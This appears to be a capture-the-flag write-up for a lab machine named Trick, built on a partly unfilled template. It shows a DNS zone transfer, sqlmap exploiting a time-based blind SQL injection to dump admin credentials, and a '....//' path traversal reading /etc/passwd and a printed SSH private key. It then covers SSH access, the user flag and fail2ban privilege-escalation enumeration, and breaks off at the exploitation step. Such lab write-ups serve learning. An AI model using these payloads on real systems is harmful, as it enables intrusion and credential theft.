
| Property         | Value                         |
| ---------------- | ----------------------------- |
| **OS**           | Linux / Windows               |
| **Difficulty**   | Easy / Medium / Hard / Insane |
| **Release Date** | YYYY-MM-DD                    |
| **State**        | YYYY-MM-DD                    |
| **IP**           | 10.10.10.X                    |
| **Techniques**   | technique-1, technique-2      |
| **Tags**         | #web #privesc #linux          |

---
## Summary

Brief 2-3 sentence ogverview of the machine and attack path.

---
## Enumeration

### Nmap Scan

```
nmap -sC -sV trick.htb --open
Starting Nmap 7.95 ( https://nmap.org ) at 2026-09-15 17:04 EDT
Nmap scan report for trick.htb (10.129.227.180)
Host is up (0.029s latency).
Not shown: 996 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 61:ff:29:3b:36:bd:9d:ac:fb:de:1f:56:88:4c:ae:2d (RSA)
|   256 9e:cd:f2:40:61:96:ea:21:a6:ce:26:02:af:75:9a:78 (ECDSA)
|_  256 72:93:f9:11:58:de:34:ad:12:b5:4b:4a:73:64:b9:70 (ED25519)
25/tcp open  smtp?
|_smtp-commands: Couldn't establish connection on port 25
53/tcp open  domain  ISC BIND 9.11.5-P4-5.1+deb10u7 (Debian Linux)
| dns-nsid: 
|_  bind.version: 9.11.5-P4-5.1+deb10u7-Debian
80/tcp open  http    nginx 1.14.2
|_http-title: Coming Soon - Start Bootstrap Theme
|_http-server-header: nginx/1.14.2
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 247.77 seconds
                                                                                            
```

### DNS Zone Transfer

```
dig AXFR @trick.htb trick.htb                           

; <<>> DiG 9.20.15-2-Debian <<>> AXFR @trick.htb trick.htb
; (1 server found)
;; global options: +cmd
trick.htb.              604800  IN      SOA     trick.htb. root.trick.htb. 5 604800 86400 2419200 604800
trick.htb.              604800  IN      NS      trick.htb.
trick.htb.              604800  IN      A       127.0.0.1
trick.htb.              604800  IN      AAAA    ::1
preprod-payroll.trick.htb. 604800 IN    CNAME   trick.htb.
trick.htb.              604800  IN      SOA     trick.htb. root.trick.htb. 5 604800 86400 2419200 604800
;; Query time: 48 msec
;; SERVER: 10.129.227.180#53(trick.htb) (TCP)
;; WHEN: Wed Sep 16 07:59:42 EDT 2026
;; XFR size: 6 records (messages 1, bytes 231)

```

img 1

---
## SQL injection

How you gained initial access to the machine.

### Vulnerability

Description of the vulnerability exploited.

### Exploitation

Capturing the login request with burpsuite:

```shell
POST /ajax.php?action=login HTTP/1.1
Host: preprod-payroll.trick.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 27
Origin: http://preprod-payroll.trick.htb
Connection: keep-alive
Referer: http://preprod-payroll.trick.htb/login.php
Cookie: PHPSESSID=pnaaf157pig45llsg0ft7hdrip
Priority: u=0

username=test&password=test

```

```
sqlmap -r req.txt --batch 
        ___
       __H__                                                                                                                                                                                                                                
 ___ ___[,]_____ ___ ___  {1.9.11#stable}                                                                                                                                                                                                   
|_ -| . [)]     | .'| . |                                                                                                                                                                                                                   
|___|_  [']_|_|_|__,|  _|                                                                                                                                                                                                                   
      |_|V...       |_|   https://sqlmap.org                                                                                                                                                                                                

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 08:41:32 /2026-09-16/

[08:41:32] [INFO] parsing HTTP request from 'req.txt'
[08:41:32] [INFO] testing connection to the target URL
[08:41:32] [INFO] testing if the target URL content is stable
[08:41:33] [INFO] target URL content is stable
[08:41:33] [INFO] testing if POST parameter 'username' is dynamic
[08:41:33] [WARNING] POST parameter 'username' does not appear to be dynamic
[08:41:33] [WARNING] heuristic (basic) test shows that POST parameter 'username' might not be injectable
[08:41:33] [INFO] testing for SQL injection on POST parameter 'username'
[08:41:33] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[08:41:34] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[08:41:34] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[08:41:34] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
[08:41:35] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
[08:41:35] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
[08:41:35] [INFO] testing 'Generic inline queries'
[08:41:35] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
[08:41:36] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
[08:41:36] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
[08:41:36] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[08:41:46] [INFO] POST parameter 'username' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable 
it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] Y
[08:41:46] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[08:41:46] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[08:41:46] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
[08:41:47] [INFO] target URL appears to have 8 columns in query
do you want to (re)try to find proper UNION column types with fuzzy test? [y/N] N
injection not exploitable with NULL values. Do you want to try with a random integer value for option '--union-char'? [Y/n] Y
[08:41:51] [WARNING] if UNION based SQL injection is not detected, please consider forcing the back-end DBMS (e.g. '--dbms=mysql') 
[08:41:52] [INFO] target URL appears to be UNION injectable with 8 columns
injection not exploitable with NULL values. Do you want to try with a random integer value for option '--union-char'? [Y/n] Y
[08:41:56] [INFO] checking if the injection point on POST parameter 'username' is a false positive
POST parameter 'username' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 210 HTTP(s) requests:
---
Parameter: username (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: username=test' AND (SELECT 3523 FROM (SELECT(SLEEP(5)))EHpf) AND 'iEAW'='iEAW&password=test
---
[08:42:12] [INFO] the back-end DBMS is MySQL
[08:42:12] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions 
do you want sqlmap to try to optimize value(s) for DBMS delay responses (option '--time-sec')? [Y/n] Y
web application technology: Nginx 1.14.2
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
[08:42:17] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/preprod-payroll.trick.htb'
[08:42:17] [WARNING] your sqlmap version is outdated

[*] ending @ 08:42:17 /2026-09-16/

```

### Database Enumeration

```
 sqlmap -r req.txt --batch --dump
        ___
       __H__                                                                                                                                                                                                                                
 ___ ___[']_____ ___ ___  {1.9.11#stable}                                                                                                                                                                                                   
|_ -| . [)]     | .'| . |                                                                                                                                                                                                                   
|___|_  [(]_|_|_|__,|  _|                                                                                                                                                                                                                   
      |_|V...       |_|   https://sqlmap.org                                                                                                                                                                                                

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 08:43:17 /2026-09-16/

[08:43:17] [INFO] parsing HTTP request from 'req.txt'
[08:43:17] [INFO] resuming back-end DBMS 'mysql' 
[08:43:17] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: username (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: username=test' AND (SELECT 3523 FROM (SELECT(SLEEP(5)))EHpf) AND 'iEAW'='iEAW&password=test
---
[08:43:17] [INFO] the back-end DBMS is MySQL
web application technology: Nginx 1.14.2
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
[08:43:17] [WARNING] missing database parameter. sqlmap is going to use the current database to enumerate table(s) entries
[08:43:17] [INFO] fetching current database
[08:43:17] [WARNING] time-based comparison requires larger statistical model, please wait.............................. (done)                                                                                                             
do you want sqlmap to try to optimize value(s) for DBMS delay responses (option '--time-sec')? [Y/n] Y
[08:43:25] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions 
[08:43:35] [INFO] adjusting time delay to 1 second due to good response times
payroll_db
[08:44:15] [INFO] fetching tables for database: 'payroll_db'
[08:44:15] [INFO] fetching number of tables for database 'payroll_db'
[08:44:15] [INFO] retrieved: 11
[08:44:18] [INFO] retrieved: position
[08:44:53] [INFO] retrieved: employee
[08:45:23] [INFO] retrieved: department
[08:46:02] [INFO] retrieved: payroll_items
[08:46:56] [INFO] retrieved: attendance
[08:47:31] [INFO] retrieved: employee_deductions
[08:48:45] [INFO] retrieved: employee_allowances
[08:49:32] [INFO] retrieved: users
[08:49:50] [INFO] retrieved: deductions
[08:50:27] [INFO] retrieved: payroll
[08:50:57] [INFO] retrieved: allowances
[08:51:34] [INFO] fetching columns for table 'allowances' in database 'payroll_db'
[08:51:34] [INFO] retrieved: 3
[08:51:38] [INFO] retrieved: id
[08:51:45] [INFO] retrieved: allowance
[08:52:18] [INFO] retrieved: description
[08:53:00] [INFO] fetching entries for table 'allowances' in database 'payroll_db'
[08:53:00] [INFO] fetching number of entries for table 'allowances' in database 'payroll_db'
[08:53:00] [INFO] retrieved: 4
[08:53:01] [WARNING] (case) time-based comparison requires reset of statistical model, please wait.............................. (done)                                                                                                    
Sample Allowance
[08:54:03] [INFO] retrieved: Sample
[08:54:26] [INFO] retrieved: 1
[08:54:29] [INFO] retrieved: Phone Allowance
[08:55:32] [INFO] retrieved: Phon^C
[08:55:54] [WARNING] Ctrl+C detected in dumping phase                                                                                                                                                                                      
Database: payroll_db
Table: allowances
[1 entry]
+----+-----------+------------------+
| id | allowance | description      |
+----+-----------+------------------+
| 1  | Sample    | Sample Allowance |
+----+-----------+------------------+

[08:55:54] [INFO] table 'payroll_db.allowances' dumped to CSV file '/home/kali/.local/share/sqlmap/output/preprod-payroll.trick.htb/dump/payroll_db/allowances.csv'
[08:55:54] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/preprod-payroll.trick.htb'
[08:55:54] [WARNING] your sqlmap version is outdated

[*] ending @ 08:55:54 /2026-09-16/


```

```
sqlmap -r req.txt --dump -T users -D payroll_db 
        ___
       __H__                                                                                                                                                                                                                                
 ___ ___[(]_____ ___ ___  {1.9.11#stable}                                                                                                                                                                                                   
|_ -| . ["]     | .'| . |                                                                                                                                                                                                                   
|___|_  [.]_|_|_|__,|  _|                                                                                                                                                                                                                   
      |_|V...       |_|   https://sqlmap.org                                                                                                                                                                                                

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 09:06:07 /2026-09-16/

[09:06:07] [INFO] parsing HTTP request from 'req.txt'
[09:06:07] [INFO] resuming back-end DBMS 'mysql' 
[09:06:07] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: username (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: username=test' AND (SELECT 3523 FROM (SELECT(SLEEP(5)))EHpf) AND 'iEAW'='iEAW&password=test
---
[09:06:07] [INFO] the back-end DBMS is MySQL
web application technology: Nginx 1.14.2
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
[09:06:07] [INFO] fetching columns for table 'users' in database 'payroll_db'
[09:06:07] [WARNING] time-based comparison requires larger statistical model, please wait.............................. (done)                                                                                                             
do you want sqlmap to try to optimize value(s) for DBMS delay responses (option '--time-sec')? [Y/n] y
[09:06:17] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions 
[09:06:27] [INFO] adjusting time delay to 1 second due to good response times
8
[09:06:27] [INFO] retrieved: id
[09:06:34] [INFO] retrieved: doctor_id
[09:07:14] [INFO] retrieved: name
[09:07:27] [INFO] retrieved: address
[09:07:51] [INFO] retrieved: contact
[09:08:17] [INFO] retrieved: username
[09:08:43] [INFO] retrieved: password
[09:09:16] [INFO] retrieved: type
[09:09:34] [INFO] fetching entries for table 'users' in database 'payroll_db'
[09:09:34] [INFO] fetching number of entries for table 'users' in database 'payroll_db'
[09:09:34] [INFO] retrieved: 1
[09:09:35] [WARNING] (case) time-based comparison requires reset of statistical model, please wait.............................. (done)                                                                                                    
Administrator
[09:10:25] [INFO] retrieved: 1
[09:10:28] [INFO] retrieved: 
[09:10:28] [WARNING] in case of continuous data retrieval problems you are advised to try a switch '--no-cast' or switch '--hex'
[09:10:28] [INFO] retrieved: 
[09:10:29] [INFO] retrieved: 0
[09:10:35] [INFO] retrieved: 1
[09:10:37] [INFO] retrieved: SuperGucciRainbowCake
[09:11:55] [INFO] retrieved: Enemigosss
Database: payroll_db
Table: users
[1 entry]
+----+-----------+---------------+--------+---------+---------+-----------------------+------------+
| id | doctor_id | name          | type   | address | contact | password              | username   |
+----+-----------+---------------+--------+---------+---------+-----------------------+------------+
| 1  | 0         | Administrator | 1      | <blank> | <blank> | SuperGucciRainbowCake | Enemigosss |
+----+-----------+---------------+--------+---------+---------+-----------------------+------------+

[09:12:32] [INFO] table 'payroll_db.users' dumped to CSV file '/home/kali/.local/share/sqlmap/output/preprod-payroll.trick.htb/dump/payroll_db/users.csv'
[09:12:32] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/preprod-payroll.trick.htb'
[09:12:32] [WARNING] your sqlmap version is outdated

[*] ending @ 09:12:32 /2026-09-16/

                                                    
```

Enemigosss:SuperGucciRainbowCake

```
 sqlmap -r req.txt --privilege                        
        ___
       __H__                                                                                                                                                                                                                                
 ___ ___["]_____ ___ ___  {1.9.11#stable}                                                                                                                                                                                                   
|_ -| . [,]     | .'| . |                                                                                                                                                                                                                   
|___|_  [.]_|_|_|__,|  _|                                                                                                                                                                                                                   
      |_|V...       |_|   https://sqlmap.org                                                                                                                                                                                                

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 17:07:40 /2026-09-17/

[17:07:40] [INFO] parsing HTTP request from 'req.txt'
[17:07:40] [INFO] resuming back-end DBMS 'mysql' 
[17:07:40] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: username (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: username=test' AND (SELECT 6469 FROM (SELECT(SLEEP(5)))WAoc) AND 'oCFZ'='oCFZ&password=test
---
[17:07:41] [INFO] the back-end DBMS is MySQL
web application technology: Nginx 1.14.2
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
[17:07:41] [INFO] fetching database users privileges
[17:07:41] [INFO] fetching database users
[17:07:41] [INFO] fetching number of database users
[17:07:41] [WARNING] time-based comparison requires larger statistical model, please wait.............................. (done)                                                                                                             
[17:07:42] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions 
do you want sqlmap to try to optimize value(s) for DBMS delay responses (option '--time-sec')? [Y/n] y
1
[17:07:49] [INFO] retrieved: 
[17:07:59] [INFO] adjusting time delay to 1 second due to good response times
'remo'@'localhost'
[17:09:10] [INFO] fetching number of privileges for user 'remo'
[17:09:10] [INFO] retrieved: 1
[17:09:11] [INFO] fetching privileges for user 'remo'
[17:09:11] [INFO] retrieved: FILE
database management system users privileges:
[*] %remo% [1]:
    privilege: FILE

[17:09:24] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/preprod-payroll.trick.htb'
[17:09:24] [WARNING] your sqlmap version is outdated

[*] ending @ 17:09:24 /2026-09-17/


```



## Path traversal

```
curl "http://preprod-marketing.trick.htb/index.php?page=....//....//....//....//etc/passwd"
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:104:110::/nonexistent:/usr/sbin/nologin
tss:x:105:111:TPM2 software stack,,,:/var/lib/tpm:/bin/false
dnsmasq:x:106:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
usbmux:x:107:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
rtkit:x:108:114:RealtimeKit,,,:/proc:/usr/sbin/nologin
pulse:x:109:118:PulseAudio daemon,,,:/var/run/pulse:/usr/sbin/nologin
speech-dispatcher:x:110:29:Speech Dispatcher,,,:/var/run/speech-dispatcher:/bin/false
avahi:x:111:120:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/usr/sbin/nologin
saned:x:112:121::/var/lib/saned:/usr/sbin/nologin
colord:x:113:122:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologin
geoclue:x:114:123::/var/lib/geoclue:/usr/sbin/nologin
hplip:x:115:7:HPLIP system user,,,:/var/run/hplip:/bin/false
Debian-gdm:x:116:124:Gnome Display Manager:/var/lib/gdm3:/bin/false
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
mysql:x:117:125:MySQL Server,,,:/nonexistent:/bin/false
sshd:x:118:65534::/run/sshd:/usr/sbin/nologin
postfix:x:119:126::/var/spool/postfix:/usr/sbin/nologin
bind:x:120:128::/var/cache/bind:/usr/sbin/nologin
michael:x:1001:1001::/home/michael:/bin/bash

```

```
 curl "http://preprod-marketing.trick.htb/index.php?page=....//....//....//....//home/michael/.ssh/id_rsa"
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn
NhAAAAAwEAAQAAAQEAwI9YLFRKT6JFTSqPt2/+7mgg5HpSwzHZwu95Nqh1Gu4+9P+ohLtz
c4jtky6wYGzlxKHg/Q5ehozs9TgNWPVKh+j92WdCNPvdzaQqYKxw4Fwd3K7F4JsnZaJk2G
YQ2re/gTrNElMAqURSCVydx/UvGCNT9dwQ4zna4sxIZF4HpwRt1T74wioqIX3EAYCCZcf+
4gAYBhUQTYeJlYpDVfbbRH2yD73x7NcICp5iIYrdS455nARJtPHYkO9eobmyamyNDgAia/
Ukn75SroKGUMdiJHnd+m1jW5mGotQRxkATWMY5qFOiKglnws/jgdxpDV9K3iDTPWXFwtK4
1kC+t4a8sQAAA8hzFJk2cxSZNgAAAAdzc2gtcnNhAAABAQDAj1gsVEpPokVNKo+3b/7uaC
DkelLDMdnC73k2qHUa7j70/6iEu3NziO2TLrBgbOXEoeD9Dl6GjOz1OA1Y9UqH6P3ZZ0I0
+93NpCpgrHDgXB3crsXgmydlomTYZhDat7+BOs0SUwCpRFIJXJ3H9S8YI1P13BDjOdrizE
hkXgenBG3VPvjCKiohfcQBgIJlx/7iABgGFRBNh4mVikNV9ttEfbIPvfHs1wgKnmIhit1L
jnmcBEm08diQ716hubJqbI0OACJr9SSfvlKugoZQx2Iked36bWNbmYai1BHGQBNYxjmoU6
IqCWfCz+OB3GkNX0reINM9ZcXC0rjWQL63hryxAAAAAwEAAQAAAQASAVVNT9Ri/dldDc3C
aUZ9JF9u/cEfX1ntUFcVNUs96WkZn44yWxTAiN0uFf+IBKa3bCuNffp4ulSt2T/mQYlmi/
KwkWcvbR2gTOlpgLZNRE/GgtEd32QfrL+hPGn3CZdujgD+5aP6L9k75t0aBWMR7ru7EYjC
tnYxHsjmGaS9iRLpo79lwmIDHpu2fSdVpphAmsaYtVFPSwf01VlEZvIEWAEY6qv7r455Ge
U+38O714987fRe4+jcfSpCTFB0fQkNArHCKiHRjYFCWVCBWuYkVlGYXLVlUcYVezS+ouM0
fHbE5GMyJf6+/8P06MbAdZ1+5nWRmdtLOFKF1rpHh43BAAAAgQDJ6xWCdmx5DGsHmkhG1V
PH+7+Oono2E7cgBv7GIqpdxRsozETjqzDlMYGnhk9oCG8v8oiXUVlM0e4jUOmnqaCvdDTS
3AZ4FVonhCl5DFVPEz4UdlKgHS0LZoJuz4yq2YEt5DcSixuS+Nr3aFUTl3SxOxD7T4tKXA
fvjlQQh81veQAAAIEA6UE9xt6D4YXwFmjKo+5KQpasJquMVrLcxKyAlNpLNxYN8LzGS0sT
AuNHUSgX/tcNxg1yYHeHTu868/LUTe8l3Sb268YaOnxEbmkPQbBscDerqEAPOvwHD9rrgn
In16n3kMFSFaU2bCkzaLGQ+hoD5QJXeVMt6a/5ztUWQZCJXkcAAACBANNWO6MfEDxYr9DP
JkCbANS5fRVNVi0Lx+BSFyEKs2ThJqvlhnxBs43QxBX0j4BkqFUfuJ/YzySvfVNPtSb0XN
jsj51hLkyTIOBEVxNjDcPWOj5470u21X8qx2F3M4+YGGH+mka7P+VVfvJDZa67XNHzrxi+
IJhaN0D5bVMdjjFHAAAADW1pY2hhZWxAdHJpY2sBAgMEBQ==
-----END OPENSSH PRIVATE KEY-----
```

---
## User Flag

```
ssh michael@trick.htb -i michael.key
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
Linux trick 4.19.0-20-amd64 #1 SMP Debian 4.19.235-1 (2022-03-17) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Thu Sep 17 23:49:48 2026 from 10.10.15.80
michael@trick:~$ sudo -l
Matching Defaults entries for michael on trick:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User michael may run the following commands on trick:
    (root) NOPASSWD: /etc/init.d/fail2ban restart

```

```
michael@trick:~$ cat user.txt
7336889372d8413cf2a12535b02e2a90
```

---
## Privilege Escalation

### Enumeration

```
michael@trick:~$ id
uid=1001(michael) gid=1001(michael) groups=1001(michael),1002(security)
michael@trick:~$ sudo -l
Matching Defaults entries for michael on trick:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User michael may run the following commands on trick:
    (root) NOPASSWD: /etc/init.d/fail2ban restart
michael@trick:~$ 
```

```
michael@trick:~$ find / -group security 2>/dev/null
/etc/fail2ban/action.d
```

```
michael@trick:~$ find / -group users 2>/dev/null
^C
michael@trick:~$ find / -group security 2>/dev/null
/etc/fail2ban/action.d
^C
michael@trick:~$ ls -la /etc/fail2ban/action.d
total 288
drwxrwx--- 2 root security  4096 Sep 18 14:42 .
drwxr-xr-x 6 root root      4096 Sep 18 14:42 ..
-rw-r--r-- 1 root root      3879 Sep 18 14:42 abuseipdb.conf
-rw-r--r-- 1 root root       587 Sep 18 14:42 apf.conf
-rw-r--r-- 1 root root       629 Sep 18 14:42 badips.conf
-rw-r--r-- 1 root root     10918 Sep 18 14:42 badips.py
-rw-r--r-- 1 root root      2631 Sep 18 14:42 blocklist_de.conf
-rw-r--r-- 1 root root      3094 Sep 18 14:42 bsd-ipfw.conf
-rw-r--r-- 1 root root      2719 Sep 18 14:42 cloudflare.conf
-rw-r--r-- 1 root root      4669 Sep 18 14:42 complain.conf
-rw-r--r-- 1 root root      7580 Sep 18 14:42 dshield.conf
-rw-r--r-- 1 root root      1629 Sep 18 14:42 dummy.conf
-rw-r--r-- 1 root root      1501 Sep 18 14:42 firewallcmd-allports.conf
-rw-r--r-- 1 root root      2649 Sep 18 14:42 firewallcmd-common.conf
-rw-r--r-- 1 root root      2235 Sep 18 14:42 firewallcmd-ipset.conf
-rw-r--r-- 1 root root      1270 Sep 18 14:42 firewallcmd-multiport.conf
-rw-r--r-- 1 root root      1898 Sep 18 14:42 firewallcmd-new.conf
-rw-r--r-- 1 root root      2314 Sep 18 14:42 firewallcmd-rich-logging.conf
-rw-r--r-- 1 root root      1765 Sep 18 14:42 firewallcmd-rich-rules.conf
-rw-r--r-- 1 root root       589 Sep 18 14:42 helpers-common.conf
-rw-r--r-- 1 root root      1402 Sep 18 14:42 hostsdeny.conf
-rw-r--r-- 1 root root      1485 Sep 18 14:42 ipfilter.conf
-rw-r--r-- 1 root root      1417 Sep 18 14:42 ipfw.conf
-rw-r--r-- 1 root root      1426 Sep 18 14:42 iptables-allports.conf
-rw-r--r-- 1 root root      2738 Sep 18 14:42 iptables-common.conf
-rw-r--r-- 1 root root      1339 Sep 18 14:42 iptables.conf
-rw-r--r-- 1 root root      2000 Sep 18 14:42 iptables-ipset-proto4.conf
-rw-r--r-- 1 root root      2197 Sep 18 14:42 iptables-ipset-proto6-allports.conf
-rw-r--r-- 1 root root      2240 Sep 18 14:42 iptables-ipset-proto6.conf
-rw-r--r-- 1 root root      1420 Sep 18 14:42 iptables-multiport.conf
-rw-r--r-- 1 root root      2082 Sep 18 14:42 iptables-multiport-log.conf
-rw-r--r-- 1 root root      1497 Sep 18 14:42 iptables-new.conf
-rw-r--r-- 1 root root      2584 Sep 18 14:42 iptables-xt_recent-echo.conf
-rw-r--r-- 1 root root      2343 Sep 18 14:42 mail-buffered.conf
-rw-r--r-- 1 root root      1621 Sep 18 14:42 mail.conf
-rw-r--r-- 1 root root      1049 Sep 18 14:42 mail-whois-common.conf
-rw-r--r-- 1 root root      1754 Sep 18 14:42 mail-whois.conf
-rw-r--r-- 1 root root      2355 Sep 18 14:42 mail-whois-lines.conf
-rw-r--r-- 1 root root      5233 Sep 18 14:42 mynetwatchman.conf
-rw-r--r-- 1 root root      1493 Sep 18 14:42 netscaler.conf
-rw-r--r-- 1 root root       490 Sep 18 14:42 nftables-allports.conf
-rw-r--r-- 1 root root      4038 Sep 18 14:42 nftables-common.conf
-rw-r--r-- 1 root root       496 Sep 18 14:42 nftables-multiport.conf
-rw-r--r-- 1 root root      3697 Sep 18 14:42 nginx-block-map.conf
-rw-r--r-- 1 root root      1436 Sep 18 14:42 npf.conf
-rw-r--r-- 1 root root      3146 Sep 18 14:42 nsupdate.conf
-rw-r--r-- 1 root root       469 Sep 18 14:42 osx-afctl.conf
-rw-r--r-- 1 root root      2214 Sep 18 14:42 osx-ipfw.conf
-rw-r--r-- 1 root root      3662 Sep 18 14:42 pf.conf
-rw-r--r-- 1 root root      1023 Sep 18 14:42 route.conf
-rw-r--r-- 1 root root      2830 Sep 18 14:42 sendmail-buffered.conf
-rw-r--r-- 1 root root      1824 Sep 18 14:42 sendmail-common.conf
-rw-r--r-- 1 root root       857 Sep 18 14:42 sendmail.conf
-rw-r--r-- 1 root root      1773 Sep 18 14:42 sendmail-geoip-lines.conf
-rw-r--r-- 1 root root       977 Sep 18 14:42 sendmail-whois.conf
-rw-r--r-- 1 root root      1052 Sep 18 14:42 sendmail-whois-ipjailmatches.conf
-rw-r--r-- 1 root root      1033 Sep 18 14:42 sendmail-whois-ipmatches.conf
-rw-r--r-- 1 root root      1300 Sep 18 14:42 sendmail-whois-lines.conf
-rw-r--r-- 1 root root       997 Sep 18 14:42 sendmail-whois-matches.conf
-rw-r--r-- 1 root root      2068 Sep 18 14:42 shorewall.conf
-rw-r--r-- 1 root root      2981 Sep 18 14:42 shorewall-ipset-proto6.conf
-rw-r--r-- 1 root root      6134 Sep 18 14:42 smtp.py
-rw-r--r-- 1 root root      1330 Sep 18 14:42 symbiosis-blacklist-allports.conf
-rw-r--r-- 1 root root      1045 Sep 18 14:42 ufw.conf
-rw-r--r-- 1 root root      6082 Sep 18 14:42 xarf-login-attack.conf
michael@trick:~$ cd /etc/fail2ban/action.d
michael@trick:/etc/fail2ban/action
```
### Exploitation

copy the `iptables-multiport.conf ` in the home directory:

```
